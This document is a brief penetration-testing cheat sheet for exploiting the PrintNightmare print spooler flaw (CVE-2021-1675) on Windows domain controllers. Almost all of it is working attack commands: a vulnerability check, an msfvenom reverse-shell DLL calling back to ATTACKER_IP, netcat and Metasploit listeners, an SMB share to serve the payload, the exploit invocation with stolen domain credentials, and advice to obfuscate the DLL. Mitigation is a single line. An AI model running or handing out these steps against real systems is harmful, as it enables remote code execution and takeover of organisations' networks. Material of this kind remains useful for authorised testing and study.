- Have user account
- Have Spooler service 
# check for vulnerability

```
rpcdump.py @DC_IP | egrep 'MS-RPRN|MS-PAD'

# If the output is like the following that means system is vulnerable
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```


# Showcase 
- create a rev_shell
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f dll > shell.dll
```

run msfconsole or listener 
```
nc -lvnp 9001

# Metasploit
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
options
set lport PORT
set lhost ATTACKER_IP

```

- Host SMB server 

```
smbserver.py share $(pwd) -smb2support # share 

```

# running payload
```
python3 CVE-2021-1675.py DOMAIN/USER:PASSWORD@IP '\\ATTACKER_IP\SHARE\shell.dll'
```

- Obfuscate the shell.dll

# Mitigation
- Disable Spooler service 


---
Tags: #AD #printer #print_nightmare #CVE2021-1675
	Resources: [RCE_CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675) [LPE_CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675) 